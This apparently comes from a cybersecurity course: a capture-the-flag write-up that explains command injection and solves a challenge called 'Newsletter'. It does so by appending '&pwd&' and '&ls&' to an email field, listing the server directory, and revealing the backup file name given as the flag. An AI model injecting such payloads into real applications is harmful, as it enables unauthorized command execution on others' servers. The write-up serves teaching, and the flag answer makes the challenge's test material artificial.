# Lesson 13: Command Injection

> Lesson Link:\
> *[https://cybertalents.com/learn/introduction-to-cybersecurity/lessons/13-command-injection](https://cybertalents.com/learn/introduction-to-cybersecurity/lessons/13-command-injection)*

## Introduction

In this lesson, we will learn about Command Injection, and how can we use it to execute commands on the server.

> ### What is Command Injection?
>
> #### Command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the host server that is running an application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible mainly due to insufficient input validation.

## Challenge

> Name:\
> *Newsletter*

---

> Description:\
> *the administrator put the backup file in the same root folder as the application, help us download this backup by retrieving the backup file name*

## Solution

In this challenge, we have a website, and we need to get the backup file name.

Lets try to send this payload to the website:

```html
admin&pwd&@admin.com
```

After sending the request, we will get a response that says:

```html
/var/www/html
```

So, we can see that the website is using `pwd` command to get the current directory, and we can use it to get the backup file name.

Lets try to send this payload to the website:

```html
admin&ls&@admin.com
```

After sending the request, we will get a response that says:

```html
emails_secret_1337.txt hgdr64.backup.tar.gz index.php
```

And Yah ! we got the backup file name.

## Flag

> hgdr64.backup.tar.gz

## References

- [https://www.owasp.org/index.php/Command_Injection](https://www.owasp.org/index.php/Command_Injection)
